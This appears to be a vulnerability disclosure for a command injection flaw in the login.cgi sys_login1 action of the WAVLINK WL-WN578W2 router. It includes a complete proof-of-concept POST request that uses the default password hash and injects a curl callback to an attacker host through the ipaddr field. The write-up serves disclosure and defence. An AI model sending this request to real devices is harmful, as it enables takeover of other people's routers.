\# WAVLINK WL-WN578W2 M78W2\\\_V221110 Command Injection (sys\\\_login1 Action in login.cgi)



PS:







1\.  QEMU simulation is difficult; use a physical WAVLINK WL-WN578W2 for testing.



2\.  Authenticated access required, but `password` uses fixed MD5 (no dynamic change). Attackers only need the password’s MD5 (e.g., default password) to reuse the exploit.



\## Overview



A command injection vulnerability exists in the `sys\_login1` action of `login.cgi` (WAVLINK WL-WN578W2, firmware M78W2\\\_V221110). The `ipaddr` parameter in `sub\_401BA4` function (login.c) lacks sanitization and is directly concatenated into system commands. With `page=sys\_login1` in POST requests to `/cgi-bin/login.cgi`, attackers with the password’s MD5 can inject arbitrary commands to control the device.







!\[Vulnerability Flow](./imgs/1.png)



\## Details







\*   \*\*Vendor\*\*: WAVLINK



\*   \*\*Product\*\*: WAVLINK WL-WN578W2



\*   \*\*Firmware\*\*: M78W2\\\_V221110



\*   \*\*Affected Endpoint\*\*: `/cgi-bin/login.cgi` (POST, `page=sys\_login1`)



\*   \*\*Vulnerable Code\*\*: `ftext` (request routing) \& `sub\_401BA4` (core logic) in login.c



\*   \*\*Vulnerability Type\*\*: Command Injection



\*   \*\*CVE ID\*\*: Pending



\*   \*\*Impact\*\*: Execute commands, read sensitive files, control the device; reusable via fixed password MD5.



\*   \*\*Reported by\*\*: n0ps1ed (n0ps1edzz@gmail.com)



\### Description







\*   \*\*Request Routing\*\*: `ftext` function parses `page=sys\_login1` and calls `sub\_401BA4`.



\*   \*\*Password Verification\*\*: `sub\_401BA4` uses `echo -n '%s' | md5sum` to verify the input `password` (fixed MD5 logic).



\*   \*\*Command Injection\*\*: `ipaddr` parameter is unsanitized and directly used in system commands. Attackers use delimiters (e.g., `;`) to inject malicious commands.







!\[MD5 Verification Logic](./imgs/2.png)







!\[Vulnerable Command Flow](./imgs/3.png)



\## Proof of Concept (PoC)



\### PoC: Inject `curl` Command



Requires the device password’s fixed MD5 (e.g., `e10adc3949ba59abbe56e057f20f883e` = default `123456`).



\#### Full PoC Request







```

POST /cgi-bin/login.cgi HTTP/1.1
Host: 192.168.10.1
Content-Length: 145
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive



page=sys_login1&ipaddr=%3A%3Affff%3A192.168.10.154;curl http://192.168.10.154:1234#&key=M55373357&password=e10adc3949ba59abbe56e057f20f883e

```



\#### PoC Results







1\.  \*\*Fixed MD5 Generation\*\*: Use `echo -n '123456' | md5sum` to get the password hash (matches PoC)







!\[MD5 Generation](./imgs/4.png)







1\.  \*\*Successful Injection\*\*: Device executes `curl`, attacker’s server records the request







!\[Injection Success](./imgs/5.png)



